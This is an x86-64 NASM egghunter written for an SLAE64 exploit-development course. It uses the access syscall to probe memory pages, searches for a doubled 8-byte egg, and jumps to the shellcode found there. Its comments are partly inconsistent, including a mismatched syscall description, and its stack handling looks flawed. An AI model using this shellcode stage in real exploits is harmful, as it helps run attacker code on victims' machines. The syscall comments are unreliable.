; File: final-egghunter.nasm
; SLAE64 assignment 3

;	need to change
; REG needed: 
;		rdx : the register where the skeleton executable stores the egghunter 
; 		rax : system call 
;		rsi : address iterator
; 		rdi : scasq instruction for comparison of 8 byte string/egg instructions 


; EGG: "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA"
;      "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA"

; SYSCALL needed:
; 		int access(const char *pathname, int mode)
; 		0x43 sigaction syscall #21
; 		when executed, the syscall will try and access space pointed by *pathname
; 		and will return error 0xf2 for EFAULT if address memory page is not accessible 
; 		same can also be achieved with the sigaction syscall, which might be more common in x86 systems



; OBJECTIVE: 
; 		1. To iterate through every accessible memory page of the program to find the egg(shellcode)
; 		2. To transfer control to the shellcode after egg is found


; NOTE: 	this scenario is most likely not probable in a real attack 
;		due to the exceptionaly large VAS of 64 bit systems
;		this exam solution is not robust, nor reuseable in a real exploit
;		this and all scripts within this entire domain of repositories are all for educational purposes only



;	start from rdx (address of egghunter, positioned earlier (little endianess) in memory)
; loop:	increment one byte
; 	check current byte
; 	if can access
; 		check for egg
;		if its egg
;			check again for second (insurance) egg
;		else
;			loop increment one byte
;		endif
;		
;	else
;		loop increment one byte
; 	endif



global _start

	EGG	equ 0xaaaaaaaaaaaaaaaa

section .text
_start:

	xor rsi, rsi			; zeroing out rsi	THIS IS THE SECOND ARGUMENT, first arg is rdi, which is the address pointed
	mov rdi, rdx

	push rdi


next_address:
	pop rdi
	inc rdi				; increment memory because the skeleton containing shellcode is located higher up in memory

	xor rax, rax			; zeroing out rax
	mov al, 21			; syscall access
	syscall				; invoking access

	cmp al, 0xf2			; comparing syscall return value for EFAULT = 0xf2
	jz next_address			; if EFAULT returns, go to the next address

	mov rax, EGG			; comparing egg with current memory position
	push rdi
	scasq				; scans rdi and compare to rax, and increments rdi by qword every scan
	
	jnz next_address		; loops to next_address if not found

	scasq				; if found, lets check for the second egg label to ensure 

	jnz next_address		; loops to next_address if insurance (second) label did not match

	jmp rdi				; egg found, jmp to edi. NOTE: rdi had been incremented by qword every scasq instruction






























	
